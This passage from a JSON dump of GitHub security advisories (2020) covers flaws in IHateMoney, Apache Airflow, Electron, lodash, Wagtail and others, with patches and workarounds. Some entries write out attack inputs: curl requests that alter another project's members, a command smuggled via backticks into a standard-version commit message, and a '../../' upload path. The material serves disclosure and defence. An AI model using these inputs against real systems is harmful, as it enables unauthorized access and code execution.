http://$SERVER/attackerProject/members/42/edit\n\n   Again, as a result of the alteration, the altered member will become associated to the project \"attackerProject\", resulting in the same information disclosure and loss of integrity on bills.\n\n3) API: DELETE requests to `/api/projects/<project>/members/<personID>` will similarly allow to delete the member `<personID>` even if it belongs to a different project than `<project>`.\n\n     $ curl -X DELETE --basic -u attackerProject:attackerPassword http://$SERVER/api/projects/attackerProject/members/42\n\n   The impact is less serious than with PUT, because DELETE only deactivates a member (it does not really delete it).\n\nAll these exploits require authentication: an attacker needs to know a valid project name and its associated \"private code\".  Once this requirement is fullfilled, the attacker can exploit this flaw to alter the state of members in any other project, without needing to know the target project name or its private code.\n\n`Person.query.get_by_name()` suffers from the same issue as `Person.query.get()`.  It has an additional issue: if multiple Person objects with the same name exist (this is possible if they are associated to different projects), `get_by_name()` will crash with `MultipleResultsFound` because of the call to `one()`.\n\nHowever, since `Person.query.get_by_name()` is currently not used anywhere in IHateMoney, the bug affecting this function has no impact and is not exploitable.",
    "summary": "Authorization Bypass in I hate money"
  },
  {
    "ghsaId": "GHSA-j38c-25fj-mr84",
    "publishedAt": "2020-07-27T16:57:34Z",
    "description": "An issue was found in Apache Airflow versions 1.10.10 and below. A stored XSS vulnerability was discovered in the Chart pages of the the \"classic\" UI.",
    "summary": "Stored XSS in Apache Airflow"
  },
  {
    "ghsaId": "GHSA-9g2w-5f3v-mfmm",
    "publishedAt": "2020-07-27T16:57:33Z",
    "description": "An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attack can connect to the broker (Redis, RabbitMQ) directly, it was possible to insert a malicious payload directly to the broker which could lead to a deserialization attack (and thus remote code execution) on the Worker.",
    "summary": "Insecure default config of Celery worker in Apache Airflow"
  },
  {
    "ghsaId": "GHSA-976r-qfjj-c24w",
    "publishedAt": "2020-07-27T16:57:33Z",
    "description": "An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attacker can connect to the broker (Redis, RabbitMQ) directly, it is possible to inject commands, resulting in the celery worker running arbitrary commands.",
    "summary": "Command injection via Celery broker in Apache Airflow"
  },
  {
    "ghsaId": "GHSA-rvmq-4x66-q7j3",
    "publishedAt": "2020-07-27T16:57:33Z",
    "description": "An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.",
    "summary": "Remote code execution in Apache Airflow"
  },
  {
    "ghsaId": "GHSA-q4p3-qw5c-mhpc",
    "publishedAt": "2020-07-27T16:57:25Z",
    "description": "An issue was found in Apache Airflow versions 1.10.10 and below. It was discovered that many of the admin management screens in the new/RBAC UI handled escaping incorrectly, allowing authenticated users with appropriate permissions to create stored XSS attacks.",
    "summary": "Multiple stored XSS in RBAC Admin screens in Apache Airflow"
  },
  {
    "ghsaId": "GHSA-7phr-5m9x-rw9q",
    "publishedAt": "2020-07-27T16:02:57Z",
    "description": "This affects all versions of package fast-http. There is no path sanitization in the path provided at fs.readFile in index.js.",
    "summary": "Directory traversal in fast-http"
  },
  {
    "ghsaId": "GHSA-w7q9-p3jq-fmhm",
    "publishedAt": "2020-07-27T15:46:57Z",
    "description": "Uncontrolled resource consumption in `jpeg-js` before 0.4.0 may allow attacker to launch denial of service attacks using specially a crafted JPEG image.",
    "summary": "Uncontrolled resource consumption in jpeg-js"
  },
  {
    "ghsaId": "GHSA-f7f4-hqp2-7prc",
    "publishedAt": "2020-07-24T20:10:21Z",
    "description": "Sails.js before v1.0.0-46 allows attackers to cause a denial of service with a single request because there is no error handler in sails-hook-sockets to handle an empty pathname in a WebSocket request.",
    "summary": "Denial of service in sails-hook-sockets "
  },
  {
    "ghsaId": "GHSA-wvh7-5p38-2qfc",
    "publishedAt": "2020-07-23T18:20:10Z",
    "description": "The `setPassword` method (http://parseplatform.org/Parse-SDK-JS/api/2.9.1/Parse.User.html#setPassword) stores the user's password in localStorage as raw text making it vulnerable to anyone with access to your localStorage. We believe this is the only time that password is stored at all. In the documentation under Users > Signing Up, it clearly states, \"We never store passwords in plaintext, nor will we ever transmit passwords back to the client in plaintext.\"\n\nExample Code:\n```js\nasync () => {\n    const user = Parse.User.current()\n    if (user) {\n        user.setPassword('newpass')\n        await user.save()\n    }\n}\n```\nAfter running the above code, the new password will be stored in localStorage as a property named \"password\".\n\nProposed Solution:\nBefore saving anything to localStorage, Parse should strip out any properties named \"password\" that are attempting to be stored with a Parse.User type object.\n\nConfiguration:\nParse SDK: 2.9.1\nParse Server: 3.9.0",
    "summary": "Storing Password in Local Storage"
  },
  {
    "ghsaId": "GHSA-v7m9-9497-p9gr",
    "publishedAt": "2020-07-22T23:07:16Z",
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nJupyterHub deployments using:\n\n- KubeSpawner <= 0.11.1 (e.g. zero-to-jupyterhub 0.9.0) and\n- enabled named_servers (not default), and\n- an Authenticator that allows:\n  - usernames with hyphens or other characters that require escape (e.g. `user-hyphen` or `user@email`), and\n  - usernames which may match other usernames up to but not including the escaped character (e.g. `user` in the above cases)\n\nIn this circumstance, certain usernames will be able to craft particular server names which will grant them access to the default server of other users who have matching usernames.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatch will be released in kubespawner 0.12 and zero-to-jupyterhub 0.9.1\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n#### KubeSpawner\n\nSpecify configuration:\n\nfor KubeSpawner\n```python\nfrom traitlets import default\nfrom kubespawner import KubeSpawner\n\nclass PatchedKubeSpawner(KubeSpawner):\n    @default(\"pod_name_template\")\n    def _default_pod_name_template(self):\n        if self.name:\n            return \"jupyter-{username}-{servername}\"\n        else:\n            return \"jupyter-{username}\"\n\n    @default(\"pvc_name_template\")\n    def _default_pvc_name_template(self):\n        if self.name:\n            return \"claim-{username}-{servername}\"\n        else:\n            return \"claim-{username}\"\n\nc.JupyterHub.spawner_class = PatchedKubeSpawner\n```\n\n**Note for KubeSpawner:** this configuration will behave differently before and after the upgrade, so will need to be removed when upgrading. Only apply this configuration while still using KubeSpawner ≤ 0.11.1 and remove it after upgrade to ensure consistent pod and pvc naming.\n\nChanging the name template means pvcs for named servers will have different names. This will result in orphaned PVCs for named servers across Hub upgrade! This may appear as data loss for users, depending on configuration, but the orphaned PVCs will still be around and data can be migrated manually (or new PVCs created manually to reference existing PVs) before deleting the old PVCs and/or PVs.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [kubespawner](https://github.com/jupyterhub/kubespawner)\n* Email us at [security@ipython.org](mailto:security@ipython.org)\n\nCredit: Jining Huang",
    "summary": "Possible pod name collisions in jupyterhub-kubespawner"
  },
  {
    "ghsaId": "GHSA-236h-rqv8-8q73",
    "publishedAt": "2020-07-22T23:06:47Z",
    "description": "### Impact\nAn authenticated user using the viewer GraphQL query can bypass all read security on his User object and can also bypass all objects linked via relation or Pointer on his User object.\n\n### Patches\nThis vulnerability has been patched in Parse Server 4.3.0.\n\n### Workarounds\nNo\n\n### References\nSee [commit 78239ac](https://github.com/parse-community/parse-server/commit/78239ac9071167fdf243c55ae4bc9a2c0b0d89aa) for details.",
    "summary": "GraphQL: Security breach on Viewer query"
  },
  {
    "ghsaId": "GHSA-2473-9hgq-j7xw",
    "publishedAt": "2020-07-20T17:50:30Z",
    "description": "### Impact\nWhen a form page type is made available to Wagtail editors through the `wagtail.contrib.forms` app, and the page template is built using Django's standard form rendering helpers such as `form.as_p` ([as directed in the documentation](https://docs.wagtail.io/en/stable/reference/contrib/forms/index.html#usage)), any HTML tags used within a form field's help text will be rendered unescaped in the page. Allowing HTML within help text is [an intentional design decision](https://docs.djangoproject.com/en/3.0/ref/models/fields/#django.db.models.Field.help_text) by Django; however, as a matter of policy Wagtail does not allow editors to insert arbitrary HTML by default, as this could potentially be used to carry out cross-site scripting attacks, including privilege escalation. This functionality should therefore not have been made available to editor-level users.\n\nThe vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.\n\n### Patches\nPatched versions have been released as Wagtail 2.7.4 (for the LTS 2.7 branch) and Wagtail 2.9.3 (for the current 2.9 branch). In these versions, help text will be escaped to prevent the inclusion of HTML tags. Site owners who wish to re-enable the use of HTML within help text (and are willing to accept the risk of this being exploited by editors) may set `WAGTAILFORMS_HELP_TEXT_ALLOW_HTML = True` in their configuration settings.\n\n### Workarounds\nSite owners who are unable to upgrade to the new versions can secure their form page templates by [rendering forms field-by-field as per Django's documentation](https://docs.djangoproject.com/en/3.0/topics/forms/#looping-over-the-form-s-fields), but omitting the `|safe` filter when outputting the help text.\n\n### Acknowledgements\nMany thanks to Timothy Bautista for reporting this issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)\n* Email us at [security@wagtail.io](mailto:security@wagtail.io) (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)",
    "summary": "Cross-Site Scripting in Wagtail"
  },
  {
    "ghsaId": "GHSA-xp63-6vf5-xf3v",
    "publishedAt": "2020-07-20T17:20:20Z",
    "description": "### Impact\n\nThe `upload` method has a command injection vulnerability. Clients of the `codecov-node` library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.\n\nA similar CVE was issued: [CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh), but the fix was incomplete. It only blocked `&`, and command injection is still possible using backticks instead to bypass the sanitizer.\n\nWe have written a [CodeQL](https://codeql.com) query, which automatically detects this vulnerability. You can see the results of the query on the `codecov-node` project [here](https://lgtm.com/query/7714424068617023832/).\n\n\n### Patches\nThis has been patched in version 3.7.1\n\n### Workarounds\n\nNone, however, the attack surface is low in this case. Particularly in the standard use of codecov, where the module is used directly in a build pipeline, not built against as a library in another application that may supply malicious input and perform command injection. \n\n### References\n*  [CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact us via our [Security Email](mailto:security@codecov.io)",
    "summary": "Command injection in codecov (npm package)"
  },
  {
    "ghsaId": "GHSA-p6mc-m468-83gw",
    "publishedAt": "2020-07-15T19:15:48Z",
    "description": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",
    "summary": "Prototype Pollution in lodash"
  },
  {
    "ghsaId": "GHSA-43jj-2rwc-2m3f",
    "publishedAt": "2020-07-15T17:38:04Z",
    "description": "In SilverStripe assets 4.0, there is broken access control on files.",
    "summary": "Broken access control on files"
  },
  {
    "ghsaId": "GHSA-7xcx-6wjh-7xp2",
    "publishedAt": "2020-07-13T21:34:59Z",
    "description": "# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2020-111`\n\nThe [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [standard-version](https://github.com/conventional-changelog/standard-version).\n\n## Summary\n\nThe `standardVersion` function has a command injection vulnerability. Clients of the `standard-version` library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.\n\n## Product\nStandard Version\n \n## Tested Version\nCommit [2f04ac8](https://github.com/conventional-changelog/standard-version/tree/2f04ac8fc1c134a1981c23a093d4eece77d0bbb9/)\n\n## Details\n\n### Issue 1: Command injection in `standardVersion`\n\nThe following proof-of-concept illustrates the vulnerability. First install Standard Version and create an empty git repo to run the PoC in:\n\n```\nnpm install standard-version\ngit init\necho \"foo\" > foo.txt # the git repo has to be non-empty\ngit add foo.txt\ngit commit -am \"initial commit\"\n```\n\nNow create a file with the following contents:\n\n```\nvar fs = require(\"fs\");\n// setting up a bit of environment\nfs.writeFileSync(\"package.json\", '{\"name\": \"foo\", \"version\": \"1.0.0\"}');\n\nconst standardVersion = require('standard-version')\n\nstandardVersion({\n  noVerify: true,\n  infile: 'foo.txt',\n  releaseCommitMessageFormat: \"bla `touch exploit`\"\n})\n```\n\nand run it:\n\n```\nnode test.js\n```\n\nNotice that a file named `exploit` has been created.\n\nThis vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:\n[CVE-2020-7646](https://github.com/advisories/GHSA-m8xj-5v73-3hh8),\n[CVE-2020-7614](https://github.com/advisories/GHSA-426h-24vj-qwxf),\n[CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh),\n[CVE-2019-10778](https://github.com/advisories/GHSA-4gp3-p7ph-x2jr),\n[CVE-2019-10776](https://github.com/advisories/GHSA-84cm-v6jp-gjmr),\n[CVE-2018-16462](https://github.com/advisories/GHSA-9jm3-5835-537m),\n[CVE-2018-16461](https://github.com/advisories/GHSA-7g2w-6r25-2j7p),\n[CVE-2018-16460](https://github.com/advisories/GHSA-cfhg-9x44-78h2),\n[CVE-2018-13797](https://github.com/advisories/GHSA-pp57-mqmh-44h7),\n[CVE-2018-3786](https://github.com/advisories/GHSA-c9j3-wqph-5xx9),\n[CVE-2018-3772](https://github.com/advisories/GHSA-wjr4-2jgw-hmv8),\n[CVE-2018-3746](https://github.com/advisories/GHSA-3pxp-6963-46r9),\n[CVE-2017-16100](https://github.com/advisories/GHSA-jcw8-r9xm-32c6),\n[CVE-2017-16042](https://github.com/advisories/GHSA-qh2h-chj9-jffq).\n\nWe have written a [CodeQL](https://codeql.com) query, which automatically detects this vulnerability. You can see the results of the query on the `standard-version` project [here](https://lgtm.com/query/237522640229151035/).\n\n#### Impact\n\nThis issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.\n\n#### Remediation\n\nWe recommend not using an API that can interpret a string as a shell command. For example, use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) instead of [`child_process.exec`](https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback).\n\n## Credit\n\nThis issue was discovered and reported by GitHub Engineer [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include `GHSL-2020-111` in any communication regarding this issue.\n\n## Disclosure Policy\n\nThis report is subject to our [coordinated disclosure policy](https://securitylab.github.com/disclosures#policy).",
    "summary": "Command Injection in standard-version"
  },
  {
    "ghsaId": "GHSA-vhr6-pvjm-9qwf",
    "publishedAt": "2020-07-10T20:55:00Z",
    "description": "### Impact\n\ndjango-two-factor-auth versions 1.11 and before store the user's password in clear text in the user session (base64-encoded). The password is stored in the session when the user submits their username and password, and is removed once they complete authentication by entering a two-factor authentication code. This means that the password is stored in clear text in the session for an arbitrary amount of time, and potentially forever if the user begins the login process by entering their username and password, and then leaves before entering their two-factor authentication code.\n\nThe severity of this issue depends on which type of session storage you have configured: in the worst case, if you're using Django's default database session storage, then users' password are stored in clear text in your database. In the best case, if you're using Django's signed cookie session, then users' passwords are only stored in clear text within their browser's cookie store. In the common case of using Django's cache session store, the users' password are stored in clear text in whatever cache storage you have configured (typically Memcached or Redis).\n\n### Patches\n\nUpgrade to version 1.12 to resolve this issue.\n\nAfter upgrading, users should be sure to delete any clear text passwords that have been stored. For example, if you're using the database session backend, you'll likely want to delete any session record from the database and purge that data from any database backups or replicas.\n\nIn addition, affected organizations who have suffered a database breach while using an affected version should inform their users that their clear text passwords have been compromised. All organizations should encourage users whose passwords were insecurely stored to change these passwords on any sites where they were used.\n\n### Workarounds\n\nSwitching Django's session storage to use signed cookies instead of the database or cache lessens the impact of this issue, but should not be done without a thorough understanding of the security tradeoffs of using signed cookies rather than a server-side session storage. There is no way to fully mitigate the issue without upgrading.\n\n### References\n\nFor an explanation of why storing cleartext password is a substantial vulnerability: [Hashing Passwords: One-Way Road to Security](https://auth0.com/blog/hashing-passwords-one-way-road-to-security/).  \nFor documentation on configuring the Django session storage engine: [Django session documentation](https://docs.djangoproject.com/en/3.0/topics/http/sessions/).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the repo](https://github.com/Bouke/django-two-factor-auth)",
    "summary": "User passwords are stored in clear text in the Django session"
  },
  {
    "ghsaId": "GHSA-2jpm-827p-j44g",
    "publishedAt": "2020-07-09T18:28:07Z",
    "description": "### Impact\nTimelineJS renders some user data as HTML. An attacker could implement an XSS exploit with maliciously crafted content in a number of data fields. This risk is present whether the source data for the timeline is stored on Google Sheets or in a JSON configuration file.\n\nMost TimelineJS users configure their timeline with a Google Sheets document. Those users are exposed to this vulnerability if they grant write access to the document to a malicious inside attacker, if the access of a trusted user is compromised, or if they grant public write access to the document.\n\nSome TimelineJS users configure their timeline with a JSON document. Those users are exposed to this vulnerability if they grant write access to the document to a malicious inside attacker, if the access of a trusted user is compromised, or if write access to the system hosting that document is otherwise compromised.\n\nAlthough the vulnerability has a [CVSS v3.1 base score of 7.2](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H), this vulnerability has a severity of Moderate due to the likeliness of exploitation.\n\n### Patches\nVersion 3.7.0 of TimelineJS addresses this in two ways. \n\n1. For content which is intended to support limited HTML markup for styling and linking, that content is \"sanitized\" before being added to the DOM.\n1. For content intended for simple text display, all markup is stripped. \n\nVery few users of TimelineJS actually install the TimelineJS code on their server. Most users publish a timeline using a URL hosted on systems we control. The fix for this issue is published to our system such that **those users will automatically begin using the new code**. The only exception would be users who have deliberately edited the embed URL to \"pin\" their timeline to an earlier version of the code.\n\nSome users of TimelineJS use it as a part of a [wordpress plugin](https://wordpress.org/plugins/knight-lab-timelinejs/). Version 3.7.0.0 of that plugin and newer integrate the updated code. Users are encouraged to update the plugin rather than manually update the embedded version of TimelineJS.\n\n### Workarounds\nTo exploit this vulnerability, the attacker must have write access to the data source for the Timeline or the server which embeds the timeline.\n\nThus, the only workaround is appropriate attention to securing write access to the Google Sheet or JSON file which serves as the data source.\n\n### References\nFor more about the release of TimelineJS which addresses this vulnerability, see the [Knight Lab website](https://knightlab.northwestern.edu/2020/07/09/timelinejs-update/index.html).\n\nA technical write-up of this vulnerability is available [here](https://zanderwork.com/blog/cve-2020-15092/).\n\n### Acknowledgements\n\nThis vulnerability was discovered by Zander Work ([@captainGeech42](https://twitter.com/captainGeech42)) of Oregon State University.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [GitHub](https://github.com/NUKnightLab/TimelineJS3/issues)\n* File a support request in our [helpdesk system](https://knightlab.zendesk.com/hc/en-us/requests/new)",
    "summary": "Stored XSS in TimelineJS3"
  },
  {
    "ghsaId": "GHSA-9h4g-27m8-qjrg",
    "publishedAt": "2020-07-07T19:24:47Z",
    "description": "All versions of `socket.io-file` are vulnerable to Path Traversal. The package fails to sanitize user input and uses it to generate the file upload paths. The `socket.io-file::createFile` message contains a `name` option that is passed directly to `path.join()`.   It is possible to upload files to arbitrary folders on the server by sending relative paths on the `name` value, such as `../../test.js`.  The `uploadDir` and `rename` options can be used to define the file upload path.",
    "summary": "Path Traversal in socket.io-file"
  },
  {
    "ghsaId": "GHSA-jmqm-f2gx-4fjv",
    "publishedAt": "2020-07-07T18:59:10Z",
    "description": "Affected versions of `npm-registry-fetch` are vulnerable to an information exposure vulnerability through log files. The cli supports URLs like `<protocol>://[<user>[:<password>]@]<hostname>[:<port>][:][/]<path>`. The password value is not redacted and is printed to stdout and also to any generated log files.",
    "summary": "Sensitive information exposure through logs in npm-registry-fetch"
  },
  {
    "ghsaId": "GHSA-93f3-23rq-pjfp",
    "publishedAt": "2020-07-07T18:56:16Z",
    "description": "Versions of the npm CLI prior to 6.14.6 are vulnerable to an information exposure vulnerability through log files. The CLI supports URLs like `<protocol>://[<user>[:<password>]@]<hostname>[:<port>][:][/]<path>`. The password value is not redacted and is printed to stdout and also to any generated log files.",
    "summary": "Sensitive information exposure through logs in npm CLI"
  },
  {
    "ghsaId": "GHSA-mm44-wc5p-wqhq",
    "publishedAt": "2020-07-07T16:45:24Z",
    "description": "### Impact\n\nThe CBOR library supports optional tags that enable CBOR objects to contain references to objects within them. Versions earlier than 4.0 resolved those references automatically. While this by itself doesn't cause much of a security problem, a denial of service can happen if those references are deeply nested and used multiple times (so that the same reference to the same object occurs multiple times), and if the decoded CBOR object is sent to a serialization method such as EncodeToBytes, ToString, or ToJSONString, since the objects referred to are expanded in the process and take up orders of magnitude more memory than if the references weren't resolved.\n\nThe impact of this problem on any particular system varies. In general, the risk is higher if the system allows users to send arbitrary CBOR objects without authentication, or exposes a remote endpoint in which arbitrary CBOR objects can be sent without authentication.\n\n### Patches\n\nThis problem is addressed in version 4.0 by disabling reference resolution by default. Users should use the latest version of this library, which is 4.0 at the time of this writing.\n\n### Workarounds\n\nSince version 3.6, an encoding option (`resolvereferences=true` or `resolvereferences=false`) in CBOREncodeOptions sets whether the CBOR processor will resolve these kinds of references when decoding a CBOR object. Set `resolvereferences=false` to disable reference resolution.\n\nIn version 3.6, if the method used CBORObject.Read() or CBORObject.DecodeFromBytes() to decode a serialized CBOR object, call the overload that takes CBOREncodeOptions as follows:\n\n    CBORObject.DecodeFromBytes(bytes, new CBOREncodeOptions(\"resolvereferences=false\"));\n\nIn versions 3.5 and earlier, this issue is present only if the CBOR object is an array or a map. If the application does not expect a decoded CBOR object to be an array or a map, it should check the CBOR object's type before encoding that object, as follows:\n\n    if (cbor.Type != CBORType.Array && cbor.Type != CBORType.Map) {\n       cbor.EncodeToBytes();\n    }\n\nAlternatively, for such versions, the application can use WriteTo to decode the CBOR object to a so-called \"limited memory stream\", that is, a Stream that throws an exception if too many bytes would be written. How to write such a limited-memory stream is nontrivial and beyond the scope of this advisory.\n\n    LimitedMemoryStream stream = new LimitedMemoryStream(100000); // Limit to 100000 bytes\n    cbor.WriteTo(stream);\n    return stream.ToBytes();\n\nTo check whether a byte array representing a CBOR object might exhibit this problem, check whether the array contains the byte 0xd8 followed immediately by either 0x19 or 0x1d. This check catches all affected CBOR objects but may catch some non-affected CBOR objects (notably integers and byte strings).\n\n### References\n\nSee the Wikipedia article [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) and the related issue in [Kubernetes](https://github.com/kubernetes/kubernetes/issues/83253).\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [the CBOR repository](https://github.com/peteroupc/cbor-java).",
    "summary": "Denial of service due to reference expansion in versions earlier than 4.0"
  },
  {
    "ghsaId": "GHSA-cr3x-7m39-c6jq",
    "publishedAt": "2020-07-07T16:34:27Z",
    "description": "The is a code injection vulnerability in versions of Rails prior to 5.0.1 that wouldallow an attacker who controlled the `locals` argument of a `render` call to perform a RCE.",
    "summary": "Potential remote code execution of user-provided local names in ActionView"
  },
  {
    "ghsaId": "GHSA-xq5j-gw7f-jgj8",
    "publishedAt": "2020-07-07T16:34:10Z",
    "description": "There is an vulnerability in rails-ujs that allows attackers to send\nCSRF tokens to wrong domains.\n\nVersions Affected:  rails <= 6.0.3\nNot affected:       Applications which don't use rails-ujs.\nFixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1\n\nImpact\n------\n\nThis is a regression of CVE-2015-1840.\n\nIn the scenario where an attacker might be able to control the href attribute of an anchor tag or\nthe action attribute of a form tag that will trigger a POST action, the attacker can set the\nhref or action to a cross-origin URL, and the CSRF token will be sent.\n\nWorkarounds\n-----------\n\nTo work around this problem, change code that allows users to control the href attribute of an anchor\ntag or the action attribute of a form tag to filter the user parameters.\n\nFor example, code like this:\n\n    link_to params\n\nto code like this:\n\n    link_to filtered_params\n\n    def filtered_params\n      # Filter just the parameters that you trust\n    end",
    "summary": "CSRF Vulnerability in rails-ujs"
  },
  {
    "ghsaId": "GHSA-wwgf-3xp7-cxj4",
    "publishedAt": "2020-07-07T16:33:45Z",
    "description": "### Impact\nInside `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::onPublish()`, messages are arbitrarily broadcasted to the related Topic if `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::dispatch()` does not succeed.  The `dispatch()` method can be considered to not succeed if (depending on the version of the bundle) the callback defined on a topic route is misconfigured, a `Gos\\Bundle\\WebSocketBundle\\Topic\\TopicInterface` implementation is not found for the callback, a topic which also implements `Gos\\Bundle\\WebSocketBundle\\Topic\\SecuredTopicInterface` rejects the connection, or an Exception is unhandled.  This can result in an unintended broadcast to the websocket server potentially with data that should be considered sensitive.\n\n### Patches\nIn 1.10.4, 2.6.1, and 3.3.0, `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::onPublish()` has been changed to no longer broadcast an event's data if `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::dispatch()` fails.\n\n### Workarounds\nUpgrade to 1.10.4, 2.6.1, and 3.3.0\n\nNote, the 1.x branch is considered end of support as of July 1, 2020.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [this repository](https://github.com/GeniusesOfSymfony/WebSocketBundle)",
    "summary": "Potentially sensitive data exposure in Symfony Web Socket Bundle"
  },
  {
    "ghsaId": "GHSA-w534-q4xf-h5v2",
    "publishedAt": "2020-07-07T16:32:49Z",
    "description": "### Impact\nA user can use the JSONP support to do a Cross-site scripting.\n\n### Patches\nUse version >= 3.24\n\n### Workarounds\nNo\n\n### References\n* https://github.com/mapfish/mapfish-print/pull/1397/commits/89155f2506b9cee822e15ce60ccae390a1419d5e\n* https://cwe.mitre.org/data/definitions/79.html\n\n### For more information\nIf you have any questions or comments about this advisory Comment the pull request: https://github.com/mapfish/mapfish-print/pull/1397",
    "summary": "XSS in Mapfish Print relating to JSONP support"
  },
  {
    "ghsaId": "GHSA-vjv6-gq77-3mjw",
    "publishedAt": "2020-07-07T16:32:45Z",
    "description": "### Impact\nA user can do to an XML External Entity (XXE) attack with the provided SDL style.\n\n### Patches\nUse version >= 3.24\n\n### Workarounds\nNo\n\n### References\n* https://cwe.mitre.org/data/definitions/611.html\n* https://github.com/mapfish/mapfish-print/pull/1397/commits/e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e\n\n### For more information\nIf you have any questions or comments about this advisory Comment the pull request: https://github.com/mapfish/mapfish-print/pull/1397",
    "summary": "XXE attack in Mapfish Print"
  },
  {
    "ghsaId": "GHSA-f9mq-jph6-9mhm",
    "publishedAt": "2020-07-07T00:01:13Z",
    "description": "### Impact\nThe vulnerability allows arbitrary local file read by defining unsafe window options on a child window opened via window.open.\n\n### Workarounds\nEnsure you are calling `event.preventDefault()` on all [`new-window`](https://electronjs.org/docs/api/web-contents#event-new-window) events where the `url` or `options` is not something you expect.\n\n### Fixed Versions\n* `9.0.0-beta.21`\n* `8.2.4`\n* `7.2.4`\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "summary": "Arbitrary file read via window-open IPC in Electron"
  },
  {
    "ghsaId": "GHSA-h9jc-284h-533g",
    "publishedAt": "2020-07-07T00:01:10Z",
    "description": "### Impact\nApps using both `contextIsolation` and `contextBridge` are affected.\n\nThis is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.\n\n### Workarounds\nThere are no app-side workarounds, you must update your Electron version to be protected.\n\n### Fixed Versions\n* `9.0.0-beta.21`\n* `8.2.4`\n* `7.2.4`\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "summary": "Context isolation bypass via contextBridge in Electron"
  },
  {
    "ghsaId": "GHSA-m93v-9qjc-3g79",
    "publishedAt": "2020-07-07T00:01:07Z",
    "description": "### Impact\nApps using `contextIsolation` are affected.\n\nThis is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.\n\n### Workarounds\nThere are no app-side workarounds, you must update your Electron version to be protected.\n\n### Fixed Versions\n* `9.0.0-beta.21`\n* `8.2.4`\n* `7.2.4`\n\n### Non-Impacted Versions\n* `9.0.0-beta.*`\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "summary": "Context isolation bypass via leaked cross-context objects in Electron"
  },
  {
    "ghsaId": "GHSA-6vrv-94jv-crrg",
    "publishedAt": "2020-07-07T00:01:05Z",
    "description": "### Impact\nApps using `contextIsolation` are affected.\n\nThis is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.\n\n### Workarounds\nThere are no app-side workarounds, you must update your Electron version to be protected.\n\n### Fixed Versions\n* `9.0.0-beta.21`\n* `8.2.4`\n* `7.2.4`\n* `6.1.11`\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "summary": "Context isolation bypass via Promise in Electron"
  },
  {
    "ghsaId": "GHSA-5f9h-9pjv-v6j7",
    "publishedAt": "2020-07-06T21:31:02Z",
    "description": "A directory traversal vulnerability exists in rack < 2.2.0 that allows an attacker perform directory traversal vulnerability in the Rack::Directory app that is bundled with Rack which could result in information disclosure.",
    "summary": "Directory traversal in Rack::Directory app bundled with Rack"
  },
  {
    "ghsaId": "GHSA-3pc2-fm7p-q2vg",
    "publishedAt": "2020-07-02T16:55:11Z",
